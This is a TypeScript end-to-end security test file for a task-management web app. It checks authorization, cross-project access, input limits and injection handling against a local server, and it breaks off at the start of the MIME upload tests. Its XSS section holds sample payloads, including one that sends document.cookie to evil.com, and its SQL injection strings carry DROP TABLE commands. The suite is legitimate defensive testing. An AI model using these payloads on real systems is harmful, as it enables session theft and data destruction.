/**
 * TaskMaster Pro -- Comprehensive Security & Edge-Case E2E Test Suite
 *
 * Tests authorization bypass, cross-project access, boundary values,
 * XSS/injection, MIME allowlists, concurrent operations, cascade deletes,
 * and role-based access controls.
 *
 * Run: npx tsx tests/e2e-security-tests.ts
 */

const BASE = 'http://localhost:4173';
const ORIGIN_HEADER = { Origin: BASE };

interface TestResult {
	category: string;
	test: string;
	status: 'PASS' | 'FAIL' | 'SKIP';
	statusCode?: number;
	detail: string;
	duration: number;
}

const RESULTS: TestResult[] = [];

// ──────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────

function extractCookies(headers: Headers): string {
	const raw = headers.getSetCookie?.() ?? [];
	return raw.map((c) => c.split(';')[0]).join('; ');
}

function mergeCookies(existing: string, incoming: string): string {
	if (!incoming) return existing;
	const map = new Map<string, string>();
	for (const part of [existing, incoming]) {
		for (const pair of part.split('; ').filter(Boolean)) {
			const [name] = pair.split('=');
			map.set(name, pair);
		}
	}
	return [...map.values()].join('; ');
}

async function measure<T>(fn: () => Promise<T>): Promise<[T, number]> {
	const start = performance.now();
	const result = await fn();
	return [result, Math.round(performance.now() - start)];
}

function record(
	category: string,
	test: string,
	status: 'PASS' | 'FAIL' | 'SKIP',
	detail: string,
	duration: number,
	statusCode?: number
) {
	RESULTS.push({ category, test, status, statusCode, detail, duration });
	const icon = status === 'PASS' ? '[PASS]' : status === 'FAIL' ? '[FAIL]' : '[SKIP]';
	console.log(`  ${icon} ${test} (${duration}ms)${statusCode ? ` [HTTP ${statusCode}]` : ''}`);
	if (status === 'FAIL') console.log(`      Detail: ${detail}`);
}

/** Register a new user and return the session cookie (with retry for rate limiting) */
async function registerUser(name: string, emailPrefix: string): Promise<string> {
	const email = `${emailPrefix}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}@test.com`;

	for (let attempt = 0; attempt < 3; attempt++) {
		const form = new URLSearchParams();
		form.set('name', name);
		form.set('email', email);
		form.set('password', 'SecurePass1!');
		form.set('confirmPassword', 'SecurePass1!');

		const res = await fetch(`${BASE}/register`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...ORIGIN_HEADER },
			body: form.toString(),
			redirect: 'manual'
		});

		const cookies = extractCookies(res.headers);
		const body = await res.text();

		if (res.status === 429) {
			await delay(2000 * (attempt + 1));
			continue;
		}

		if (!cookies.includes('session=')) {
			throw new Error(`Failed to register user ${name}: no session cookie, status=${res.status}, body=${body.substring(0, 200)}`);
		}
		return cookies;
	}
	throw new Error(`Failed to register user ${name} after 3 retries (rate limited)`);
}

/** Get the user profile for a session (with retry for rate limiting) */
async function getMe(cookie: string): Promise<{ id: string; email: string; name: string; role: string }> {
	for (let attempt = 0; attempt < 3; attempt++) {
		const res = await fetch(`${BASE}/api/v1/users/me`, { headers: { Cookie: cookie } });
		if (res.ok) return res.json();
		if (res.status === 429) {
			await res.text();
			await delay(2000 * (attempt + 1));
			continue;
		}
		throw new Error(`getMe failed: ${res.status}`);
	}
	throw new Error('getMe failed after 3 retries (rate limited)');
}

/** Create a project and return its ID (with retry for rate limiting) */
async function createProject(cookie: string, name: string): Promise<string> {
	for (let attempt = 0; attempt < 3; attempt++) {
		const form = new URLSearchParams();
		form.set('name', name);
		form.set('description', 'Test project');

		const res = await fetch(`${BASE}/projects?/create`, {
			method: 'POST',
			headers: {
				Cookie: cookie,
				'Content-Type': 'application/x-www-form-urlencoded',
				...ORIGIN_HEADER
			},
			body: form.toString(),
			redirect: 'manual'
		});

		const body = await res.text();

		if (res.status === 429) {
			await delay(2000 * (attempt + 1));
			continue;
		}

		let location = res.headers.get('location') || '';
		if (!location && body.includes('"redirect"')) {
			try {
				const parsed = JSON.parse(body);
				location = parsed.location || '';
			} catch {}
		}
		const match = location.match(/\/projects\/([^/]+)\/board/);
		if (!match) throw new Error(`Failed to create project: status=${res.status}, body=${body.substring(0, 200)}`);
		return match[1];
	}
	throw new Error('Failed to create project after 3 retries (rate limited)');
}

/** Get the first column ID for a project from the DB */
async function getFirstColumnId(projectId: string): Promise<string> {
	const { createClient } = await import('@libsql/client');
	const client = createClient({ url: 'file:./local.db' });
	const result = await client.execute({
		sql: 'SELECT id FROM columns WHERE project_id = ? ORDER BY position LIMIT 1',
		args: [projectId]
	});
	client.close();
	if (result.rows.length === 0) throw new Error(`No columns found for project ${projectId}`);
	return result.rows[0].id as string;
}

/** Small delay to avoid rate limiting */
function delay(ms: number): Promise<void> {
	return new Promise((resolve) => setTimeout(resolve, ms));
}

/** Create a task and return the task object (with retry for rate limiting) */
async function createTask(
	cookie: string,
	projectId: string,
	columnId: string,
	title: string,
	priority: string = 'medium'
): Promise<{ id: string; displayId: string; title: string }> {
	for (let attempt = 0; attempt < 3; attempt++) {
		const res = await fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: cookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ projectId, columnId, title, priority })
		});
		if (res.status === 201) {
			return res.json();
		}
		if (res.status === 429) {
			await res.text();
			await delay(2000 * (attempt + 1));
			continue;
		}
		const errBody = await res.text();
		throw new Error(`Failed to create task: ${res.status} ${errBody.substring(0, 200)}`);
	}
	throw new Error('Failed to create task after 3 retries (rate limited)');
}

/** Invite a user to a project with a specific role (with retry for rate limiting) */
async function inviteUserToProject(
	ownerCookie: string,
	projectId: string,
	userEmail: string,
	role: string
): Promise<void> {
	for (let attempt = 0; attempt < 3; attempt++) {
		const form = new URLSearchParams();
		form.set('email', userEmail);
		form.set('role', role);

		const res = await fetch(`${BASE}/projects/${projectId}/settings?/invite`, {
			method: 'POST',
			headers: {
				Cookie: ownerCookie,
				'Content-Type': 'application/x-www-form-urlencoded',
				...ORIGIN_HEADER
			},
			body: form.toString(),
			redirect: 'manual'
		});
		const body = await res.text();
		if (res.status === 429) {
			await delay(2000 * (attempt + 1));
			continue;
		}
		return;
	}
}

// ──────────────────────────────────────────────
// Shared state
// ──────────────────────────────────────────────

let userACookie = '';
let userBCookie = '';
let userAId = '';
let userBId = '';
let userAEmail = '';
let userBEmail = '';
let projectAId = '';
let projectBId = '';
let projectAColumnId = '';
let projectBColumnId = '';

// ──────────────────────────────────────────────
// Setup: Register users and create projects
// ──────────────────────────────────────────────

async function setup() {
	console.log('\n=======================================');
	console.log('  SETUP: Register users & create projects');
	console.log('=======================================');

	// Register User A
	const [cookieA, durA] = await measure(() => registerUser('User A Security', 'security-a'));
	userACookie = cookieA;
	record('Setup', 'Register User A', 'PASS', 'Session acquired', durA);

	// Register User B
	const [cookieB, durB] = await measure(() => registerUser('User B Security', 'security-b'));
	userBCookie = cookieB;
	record('Setup', 'Register User B', 'PASS', 'Session acquired', durB);

	// Get user details
	const meA = await getMe(userACookie);
	userAId = meA.id;
	userAEmail = meA.email;

	const meB = await getMe(userBCookie);
	userBId = meB.id;
	userBEmail = meB.email;

	// Create Project A (owned by User A)
	const [pA, durPA] = await measure(() => createProject(userACookie, 'Security Project A'));
	projectAId = pA;
	record('Setup', 'Create Project A (User A)', 'PASS', `projectId=${projectAId}`, durPA);

	// Create Project B (owned by User B)
	const [pB, durPB] = await measure(() => createProject(userBCookie, 'Security Project B'));
	projectBId = pB;
	record('Setup', 'Create Project B (User B)', 'PASS', `projectId=${projectBId}`, durPB);

	// Get column IDs
	projectAColumnId = await getFirstColumnId(projectAId);
	projectBColumnId = await getFirstColumnId(projectBId);
}

// ──────────────────────────────────────────────
// 1. Authorization Bypass Tests
// ──────────────────────────────────────────────

async function testAuthorizationBypass() {
	console.log('\n=======================================');
	console.log('  1. AUTHORIZATION BYPASS TESTS');
	console.log('=======================================');

	// 1a. Try accessing another user's project tasks without being a member
	const [res1, dur1] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks?projectId=${projectBId}`, {
			headers: { Cookie: userACookie }
		})
	);
	await res1.text();
	if (res1.status === 403) {
		record('AuthBypass', 'Access other user project tasks (should 403)', 'PASS', 'Correctly denied', dur1, res1.status);
	} else {
		record('AuthBypass', 'Access other user project tasks (should 403)', 'FAIL', `Expected 403, got ${res1.status}`, dur1, res1.status);
	}

	// 1b. Try updating a task in a project you don't belong to
	// First, create a task in Project B as User B
	let taskInB: { id: string; displayId: string; title: string } | null = null;
	try {
		taskInB = await createTask(userBCookie, projectBId, projectBColumnId, 'Task in Project B');
	} catch (e: any) {
		record('AuthBypass', 'Create task in Project B for test', 'FAIL', e.message, 0);
	}

	if (taskInB) {
		const [res2, dur2] = await measure(() =>
			fetch(`${BASE}/api/v1/tasks/${taskInB!.id}`, {
				method: 'PATCH',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({ title: 'Hijacked!' })
			})
		);
		await res2.text();
		if (res2.status === 403) {
			record('AuthBypass', 'Update task in foreign project (should 403)', 'PASS', 'Correctly denied', dur2, res2.status);
		} else {
			record('AuthBypass', 'Update task in foreign project (should 403)', 'FAIL', `Expected 403, got ${res2.status}`, dur2, res2.status);
		}

		// 1c. Try deleting a task as a viewer (role check)
		// Invite User A as viewer on Project B
		await inviteUserToProject(userBCookie, projectBId, userAEmail, 'viewer');

		const [res3, dur3] = await measure(() =>
			fetch(`${BASE}/api/v1/tasks/${taskInB!.id}`, {
				method: 'DELETE',
				headers: { Cookie: userACookie }
			})
		);
		await res3.text();
		if (res3.status === 403) {
			record('AuthBypass', 'Delete task as viewer (should 403)', 'PASS', 'Viewer correctly denied delete', dur3, res3.status);
		} else {
			record('AuthBypass', 'Delete task as viewer (should 403)', 'FAIL', `Expected 403, got ${res3.status}`, dur3, res3.status);
		}
	}

	// 1d. Try accessing /api/v1/users/me with expired/invalid session cookie
	const [res4, dur4] = await measure(() =>
		fetch(`${BASE}/api/v1/users/me`, {
			headers: { Cookie: 'session=totally-invalid-session-id-abc123' }
		})
	);
	await res4.text();
	if (res4.status === 401) {
		record('AuthBypass', 'Access /api/v1/users/me with invalid session', 'PASS', '401 as expected', dur4, res4.status);
	} else {
		record('AuthBypass', 'Access /api/v1/users/me with invalid session', 'FAIL', `Expected 401, got ${res4.status}`, dur4, res4.status);
	}

	// 1e. Try accessing /api/v1/users/me with empty session cookie
	const [res4b, dur4b] = await measure(() =>
		fetch(`${BASE}/api/v1/users/me`, {
			headers: { Cookie: 'session=' }
		})
	);
	await res4b.text();
	if (res4b.status === 401) {
		record('AuthBypass', 'Access /api/v1/users/me with empty session', 'PASS', '401 as expected', dur4b, res4b.status);
	} else {
		record('AuthBypass', 'Access /api/v1/users/me with empty session', 'FAIL', `Expected 401, got ${res4b.status}`, dur4b, res4b.status);
	}

	// 1f. Try creating a task in a project that doesn't exist
	const [res5, dur5] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: 'nonexistent-project-id-999',
				columnId: 'nonexistent-column-id-999',
				title: 'Ghost task'
			})
		})
	);
	await res5.text();
	// Should fail with 403 (no project access) or 400 (invalid)
	if (res5.status === 403 || res5.status === 400 || res5.status === 404) {
		record('AuthBypass', 'Create task in nonexistent project', 'PASS', `Rejected with ${res5.status}`, dur5, res5.status);
	} else {
		record('AuthBypass', 'Create task in nonexistent project', 'FAIL', `Expected 403/400/404, got ${res5.status}`, dur5, res5.status);
	}
}

// ──────────────────────────────────────────────
// 2. Cross-Project Access Tests
// ──────────────────────────────────────────────

async function testCrossProjectAccess() {
	console.log('\n=======================================');
	console.log('  2. CROSS-PROJECT ACCESS TESTS');
	console.log('=======================================');

	// 2a. User A tries to list tasks from Project B (should 403)
	// Note: User A was invited as viewer to Project B in the authBypass tests above,
	// so this should actually succeed now. We need a fresh project for isolation.
	const [freshProjectB, durFresh] = await measure(() =>
		createProject(userBCookie, 'Isolated Project B')
	);
	record('CrossProject', 'Create isolated Project B', 'PASS', `projectId=${freshProjectB}`, durFresh);

	const [res1, dur1] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks?projectId=${freshProjectB}`, {
			headers: { Cookie: userACookie }
		})
	);
	await res1.text();
	if (res1.status === 403) {
		record('CrossProject', 'User A lists tasks from isolated Project B (should 403)', 'PASS', 'Access denied', dur1, res1.status);
	} else {
		record('CrossProject', 'User A lists tasks from isolated Project B (should 403)', 'FAIL', `Expected 403, got ${res1.status}`, dur1, res1.status);
	}

	// 2b. User B tries to create task in Project A (should 403)
	const [res2, dur2] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userBCookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: projectAId,
				columnId: projectAColumnId,
				title: 'Unauthorized task in Project A'
			})
		})
	);
	await res2.text();
	if (res2.status === 403) {
		record('CrossProject', 'User B creates task in Project A (should 403)', 'PASS', 'Access denied', dur2, res2.status);
	} else {
		record('CrossProject', 'User B creates task in Project A (should 403)', 'FAIL', `Expected 403, got ${res2.status}`, dur2, res2.status);
	}

	// 2c. User B tries to update Project A settings (should fail)
	const formUpdate = new URLSearchParams();
	formUpdate.set('name', 'Hijacked Project Name');
	formUpdate.set('visibility', 'public');

	const [res3, dur3] = await measure(() =>
		fetch(`${BASE}/projects/${projectAId}/settings?/update`, {
			method: 'POST',
			headers: {
				Cookie: userBCookie,
				'Content-Type': 'application/x-www-form-urlencoded',
				...ORIGIN_HEADER
			},
			body: formUpdate.toString(),
			redirect: 'manual'
		})
	);
	const body3 = await res3.text();
	// Form actions via fetch return 200 with {type:"failure"} or actual 403
	const isFailure3 = res3.status === 403 || body3.includes('"failure"') || body3.includes('Forbidden');
	if (isFailure3) {
		record('CrossProject', 'User B updates Project A settings (should fail)', 'PASS', 'Settings update denied', dur3, res3.status);
	} else {
		record('CrossProject', 'User B updates Project A settings (should fail)', 'FAIL', `Expected failure, got status=${res3.status}, body=${body3.substring(0, 200)}`, dur3, res3.status);
	}

	// 2d. User B tries to invite someone to Project A (should fail)
	const formInvite = new URLSearchParams();
	formInvite.set('email', userBEmail);
	formInvite.set('role', 'owner');

	const [res4, dur4] = await measure(() =>
		fetch(`${BASE}/projects/${projectAId}/settings?/invite`, {
			method: 'POST',
			headers: {
				Cookie: userBCookie,
				'Content-Type': 'application/x-www-form-urlencoded',
				...ORIGIN_HEADER
			},
			body: formInvite.toString(),
			redirect: 'manual'
		})
	);
	const body4 = await res4.text();
	const isFailure4 = res4.status === 403 || body4.includes('"failure"') || body4.includes('Forbidden');
	if (isFailure4) {
		record('CrossProject', 'User B invites to Project A (should fail)', 'PASS', 'Invitation denied', dur4, res4.status);
	} else {
		record('CrossProject', 'User B invites to Project A (should fail)', 'FAIL', `Expected failure, got status=${res4.status}, body=${body4.substring(0, 200)}`, dur4, res4.status);
	}

	// 2e. User A tries to create a label in isolated Project B (should 403)
	const [res5, dur5] = await measure(() =>
		fetch(`${BASE}/api/v1/labels`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ projectId: freshProjectB, name: 'hacked', color: '#ff0000' })
		})
	);
	await res5.text();
	if (res5.status === 403) {
		record('CrossProject', 'User A creates label in isolated Project B (should 403)', 'PASS', 'Access denied', dur5, res5.status);
	} else {
		record('CrossProject', 'User A creates label in isolated Project B (should 403)', 'FAIL', `Expected 403, got ${res5.status}`, dur5, res5.status);
	}
}

// ──────────────────────────────────────────────
// 3. Boundary Value Tests
// ──────────────────────────────────────────────

async function testBoundaryValues() {
	console.log('\n=======================================');
	console.log('  3. BOUNDARY VALUE TESTS');
	console.log('=======================================');

	// 3a. Create task with maximum length title (500 chars)
	const maxTitle = 'A'.repeat(500);
	const [res1, dur1] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: projectAId,
				columnId: projectAColumnId,
				title: maxTitle
			})
		})
	);
	const task1 = await res1.json();
	if (res1.status === 201 && task1.title && task1.title.length === 500) {
		record('Boundary', 'Create task with 500-char title (max allowed)', 'PASS', `Title stored: ${task1.title.length} chars`, dur1, res1.status);
	} else {
		record('Boundary', 'Create task with 500-char title (max allowed)', 'FAIL', `status=${res1.status}, title length=${task1.title?.length}`, dur1, res1.status);
	}

	// 3b. Create task with title that's 501 chars (should fail)
	const overTitle = 'B'.repeat(501);
	const [res2, dur2] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: projectAId,
				columnId: projectAColumnId,
				title: overTitle
			})
		})
	);
	await res2.text();
	if (res2.status === 400) {
		record('Boundary', 'Create task with 501-char title (should fail)', 'PASS', 'Correctly rejected', dur2, res2.status);
	} else {
		record('Boundary', 'Create task with 501-char title (should fail)', 'FAIL', `Expected 400, got ${res2.status}`, dur2, res2.status);
	}

	// 3c. Create task with empty title (should fail)
	const [res2b, dur2b] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: projectAId,
				columnId: projectAColumnId,
				title: ''
			})
		})
	);
	await res2b.text();
	if (res2b.status === 400) {
		record('Boundary', 'Create task with empty title (should fail)', 'PASS', 'Correctly rejected', dur2b, res2b.status);
	} else {
		record('Boundary', 'Create task with empty title (should fail)', 'FAIL', `Expected 400, got ${res2b.status}`, dur2b, res2b.status);
	}

	// 3d. Create a task for comment testing
	let commentTestTaskId = '';
	try {
		const t = await createTask(userACookie, projectAId, projectAColumnId, 'Comment boundary test task');
		commentTestTaskId = t.id;
	} catch (e: any) {
		record('Boundary', 'Create task for comment tests', 'FAIL', e.message, 0);
	}

	if (commentTestTaskId) {
		// 3e. Create comment with max length body (10000 chars)
		const maxBody = 'C'.repeat(10000);
		const [res3, dur3] = await measure(() =>
			fetch(`${BASE}/api/v1/comments`, {
				method: 'POST',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({ taskId: commentTestTaskId, body: maxBody })
			})
		);
		const comment3 = await res3.json();
		if (res3.status === 201 && comment3.body && comment3.body.length === 10000) {
			record('Boundary', 'Create comment with 10000-char body (max)', 'PASS', `Body stored: ${comment3.body.length} chars`, dur3, res3.status);
		} else {
			record('Boundary', 'Create comment with 10000-char body (max)', 'FAIL', `status=${res3.status}, body length=${comment3.body?.length}`, dur3, res3.status);
		}

		// 3f. Create comment with body > 10000 chars (should fail)
		const overBody = 'D'.repeat(10001);
		const [res4, dur4] = await measure(() =>
			fetch(`${BASE}/api/v1/comments`, {
				method: 'POST',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({ taskId: commentTestTaskId, body: overBody })
			})
		);
		await res4.text();
		if (res4.status === 400) {
			record('Boundary', 'Create comment with 10001-char body (should fail)', 'PASS', 'Correctly rejected', dur4, res4.status);
		} else {
			record('Boundary', 'Create comment with 10001-char body (should fail)', 'FAIL', `Expected 400, got ${res4.status}`, dur4, res4.status);
		}

		// 3g. Create comment with empty body (should fail)
		const [res4b, dur4b] = await measure(() =>
			fetch(`${BASE}/api/v1/comments`, {
				method: 'POST',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({ taskId: commentTestTaskId, body: '' })
			})
		);
		await res4b.text();
		if (res4b.status === 400) {
			record('Boundary', 'Create comment with empty body (should fail)', 'PASS', 'Correctly rejected', dur4b, res4b.status);
		} else {
			record('Boundary', 'Create comment with empty body (should fail)', 'FAIL', `Expected 400, got ${res4b.status}`, dur4b, res4b.status);
		}
	}

	// 3h. Create label with empty name (should fail)
	const [res5, dur5] = await measure(() =>
		fetch(`${BASE}/api/v1/labels`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ projectId: projectAId, name: '', color: '#ff0000' })
		})
	);
	await res5.text();
	if (res5.status === 400) {
		record('Boundary', 'Create label with empty name (should fail)', 'PASS', 'Correctly rejected', dur5, res5.status);
	} else {
		record('Boundary', 'Create label with empty name (should fail)', 'FAIL', `Expected 400, got ${res5.status}`, dur5, res5.status);
	}

	// 3i. Create label with name exceeding max (50 chars)
	const overLabelName = 'L'.repeat(51);
	const [res5b, dur5b] = await measure(() =>
		fetch(`${BASE}/api/v1/labels`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({ projectId: projectAId, name: overLabelName, color: '#ff0000' })
		})
	);
	await res5b.text();
	if (res5b.status === 400) {
		record('Boundary', 'Create label with 51-char name (should fail)', 'PASS', 'Correctly rejected', dur5b, res5b.status);
	} else {
		record('Boundary', 'Create label with 51-char name (should fail)', 'FAIL', `Expected 400, got ${res5b.status}`, dur5b, res5b.status);
	}

	// 3j. Create task with invalid priority value (should fail)
	const [res6, dur6] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: projectAId,
				columnId: projectAColumnId,
				title: 'Invalid priority task',
				priority: 'super_critical'
			})
		})
	);
	await res6.text();
	if (res6.status === 400) {
		record('Boundary', 'Create task with invalid priority (should fail)', 'PASS', 'Correctly rejected', dur6, res6.status);
	} else {
		record('Boundary', 'Create task with invalid priority (should fail)', 'FAIL', `Expected 400, got ${res6.status}`, dur6, res6.status);
	}

	// 3k. Update task with invalid status value (should fail)
	if (commentTestTaskId) {
		const [res7, dur7] = await measure(() =>
			fetch(`${BASE}/api/v1/tasks/${commentTestTaskId}`, {
				method: 'PATCH',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({ status: 'wontfix' })
			})
		);
		await res7.text();
		if (res7.status === 400) {
			record('Boundary', 'Update task with invalid status (should fail)', 'PASS', 'Correctly rejected', dur7, res7.status);
		} else {
			record('Boundary', 'Update task with invalid status (should fail)', 'FAIL', `Expected 400, got ${res7.status}`, dur7, res7.status);
		}
	}

	// 3l. Create task with negative story points (should fail)
	const [res8, dur8] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: projectAId,
				columnId: projectAColumnId,
				title: 'Negative story points',
				storyPoints: -5
			})
		})
	);
	await res8.text();
	if (res8.status === 400) {
		record('Boundary', 'Create task with negative storyPoints (should fail)', 'PASS', 'Correctly rejected', dur8, res8.status);
	} else {
		record('Boundary', 'Create task with negative storyPoints (should fail)', 'FAIL', `Expected 400, got ${res8.status}`, dur8, res8.status);
	}

	// 3m. Create task with negative estimateMinutes (should fail)
	const [res9, dur9] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: projectAId,
				columnId: projectAColumnId,
				title: 'Negative estimate',
				estimateMinutes: -30
			})
		})
	);
	await res9.text();
	if (res9.status === 400) {
		record('Boundary', 'Create task with negative estimateMinutes (should fail)', 'PASS', 'Correctly rejected', dur9, res9.status);
	} else {
		record('Boundary', 'Create task with negative estimateMinutes (should fail)', 'FAIL', `Expected 400, got ${res9.status}`, dur9, res9.status);
	}
}

// ──────────────────────────────────────────────
// 4. XSS / Injection Tests
// ──────────────────────────────────────────────

async function testXssInjection() {
	console.log('\n=======================================');
	console.log('  4. XSS / INJECTION TESTS');
	console.log('=======================================');

	// 4a. Create task with XSS payload in title
	const xssTitle = '<script>alert(1)</script>';
	const [res1, dur1] = await measure(() =>
		fetch(`${BASE}/api/v1/tasks`, {
			method: 'POST',
			headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
			body: JSON.stringify({
				projectId: projectAId,
				columnId: projectAColumnId,
				title: xssTitle
			})
		})
	);
	const xssTask = await res1.json();
	if (res1.status === 201 && xssTask.title === xssTitle) {
		record('XSS', 'Create task with <script> in title', 'PASS', `Stored as-is: "${xssTask.title}" (not executed, safely stored)`, dur1, res1.status);
	} else if (res1.status === 201) {
		record('XSS', 'Create task with <script> in title', 'PASS', `Stored (possibly sanitized): "${xssTask.title}"`, dur1, res1.status);
	} else {
		record('XSS', 'Create task with <script> in title', 'FAIL', `status=${res1.status}`, dur1, res1.status);
	}

	// 4b. Verify the XSS payload is returned safely via API (not executed in context)
	if (xssTask.id) {
		const [res1b, dur1b] = await measure(() =>
			fetch(`${BASE}/api/v1/tasks/${xssTask.id}`, {
				headers: { Cookie: userACookie }
			})
		);
		const retrieved = await res1b.json();
		if (res1b.ok && retrieved.title === xssTitle) {
			record('XSS', 'Retrieve XSS task via API (stored as-is)', 'PASS', `Title returned as plain text: "${retrieved.title}"`, dur1b, res1b.status);
		} else {
			record('XSS', 'Retrieve XSS task via API (stored as-is)', 'FAIL', `Retrieved title: "${retrieved.title}"`, dur1b, res1b.status);
		}
	}

	// 4c. Create task with more complex XSS payloads
	const xssPayloads = [
		'<img src=x onerror=alert(1)>',
		'"><svg/onload=alert(1)>',
		'javascript:alert(1)',
		'<iframe src="javascript:alert(1)"></iframe>'
	];

	for (const payload of xssPayloads) {
		const [resXss, durXss] = await measure(() =>
			fetch(`${BASE}/api/v1/tasks`, {
				method: 'POST',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({
					projectId: projectAId,
					columnId: projectAColumnId,
					title: payload
				})
			})
		);
		const xssResult = await resXss.json();
		if (resXss.status === 201) {
			record('XSS', `XSS payload in title: ${payload.substring(0, 30)}...`, 'PASS', `Stored safely, title="${xssResult.title?.substring(0, 50)}"`, durXss, resXss.status);
		} else {
			record('XSS', `XSS payload in title: ${payload.substring(0, 30)}...`, 'PASS', `Rejected (also safe): status=${resXss.status}`, durXss, resXss.status);
		}
	}

	// 4d. Create comment with XSS payload in body
	let xssCommentTaskId = '';
	try {
		const t = await createTask(userACookie, projectAId, projectAColumnId, 'XSS comment test task');
		xssCommentTaskId = t.id;
	} catch {}

	if (xssCommentTaskId) {
		const xssBody = '<script>document.cookie</script><img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">';
		const [res2, dur2] = await measure(() =>
			fetch(`${BASE}/api/v1/comments`, {
				method: 'POST',
				headers: { Cookie: userACookie, 'Content-Type': 'application/json' },
				body: JSON.stringify({ taskId: xssCommentTaskId, body: xssBody })
			})
		);
		const xssComment = await res2.json();
		if (res2.status === 201 && xssComment.body === xssBody) {
			record('XSS', 'Create comment with XSS payload in body', 'PASS', 'Stored as-is (safe for API return, frontend must escape)', dur2, res2.status);
		} else if (res2.status === 201) {
			record('XSS', 'Create comment with XSS payload in body', 'PASS', `Stored (possibly sanitized): body length=${xssComment.body?.length}`, dur2, res2.status);
		} else {
			record('XSS', 'Create comment with XSS payload in body', 'FAIL', `status=${res2.status}`, dur2, res2.status);
		}
	}

	// 4e. Create project with SQL injection in name
	const sqlInjectionName = "'; DROP TABLE users; --";
	const form = new URLSearchParams();
	form.set('name', sqlInjectionName);
	form.set('description', "Robert'); DROP TABLE tasks;--");

	const [res3, dur3] = await measure(() =>
		fetch(`${BASE}/projects?/create`, {
			method: 'POST',
			headers: {
				Cookie: userACookie,
				'Content-Type': 'application/x-www-form-urlencoded',
				...ORIGIN_HEADER
			},
			body: form.toString(),
			redirect: 'manual'
		})
	);
	const body3 = await res3.text();
	let injectionProjectLocation = res3.headers.get('location') || '';
	if (!injectionProjectLocation && body3.includes('"redirect"')) {
		try {
			const parsed = JSON.parse(body3);
			injectionProjectLocation = parsed.location || '';
		} catch {}
	}
	const injMatch = injectionProjectLocation.match(/\/projects\/([^/]+)\/board/);
	if (injMatch) {
		record('XSS', 'Create project with SQL injection name', 'PASS', `Project created safely (parameterized queries), id=${injMatch[1]}`, dur3, res3.status);

		// Verify the users table still exists
		try {
			const { createClient } = await import('@libsql/client');
			const client = createClient({ url: 'file:./local.db' });
			const result = await client.execute({ sql: 'SELECT COUNT(*) as cnt FROM users', args: [] });
			const count = result.rows[0].cnt as number;
			client.close();
			if (count > 0) {
				record('XSS', 'Verify users table intact after SQL injection', 'PASS', `users table has ${count} rows`, 0);
			} else {
				record('XSS', 'Verify users table intact after SQL injection', 'FAIL', 'users table appears empty', 0);
			}
		} catch (e: any) {
			record('XSS', 'Verify users table intact after SQL injection', 'FAIL', `DB error: ${e.message}`, 0);
		}

		// Verify the project name was stored literally
		try {
			const { createClient } = await import('@libsql/client');
			const client = createClient({ url: 'file:./local.db' });
			const result = await client.execute({
				sql: 'SELECT name FROM projects WHERE id = ?',
				args: [injMatch[1]]
			});
			client.close();
			const storedName = result.rows[0]?.name as string;
			if (storedName === sqlInjectionName) {
				record('XSS', 'SQL injection name stored literally', 'PASS', `name="${storedName}"`, 0);
			} else {
				record('XSS', 'SQL injection name stored literally', 'FAIL', `Expected "${sqlInjectionName}", got "${storedName}"`, 0);
			}
		} catch (e: any) {
			record('XSS', 'SQL injection name stored literally', 'FAIL', `DB error: ${e.message}`, 0);
		}
	} else {
		// Even rejection is acceptable for SQL injection
		record('XSS', 'Create project with SQL injection name', 'PASS', `Rejected or handled safely: status=${res3.status}`, dur3, res3.status);
	}
}

// ──────────────────────────────────────────────
// 5. MIME Type Allowlist Tests
// ──────────────────────────────────────────────

async function testMimeTypeAllowlist() {
	console.log('\n=======================================');
	console.log('  5. MIME TYPE ALLOWLIST TESTS');
	console.log('=======================================');

	// Create a task for file upload tests
	let uploadTaskId = '';
	try {
		const t = await createTask(userACookie, projectAId, projectAColumnId, 'File upload test task');
		uploadTaskId = t.id;
	} catch (e: any) {
		record('MIME', 'Create task for upload tests', 'FAIL', e.message, 0);
		return;
	}

	// 5a. Try to upload with disallowed MIME type: application/x-executable
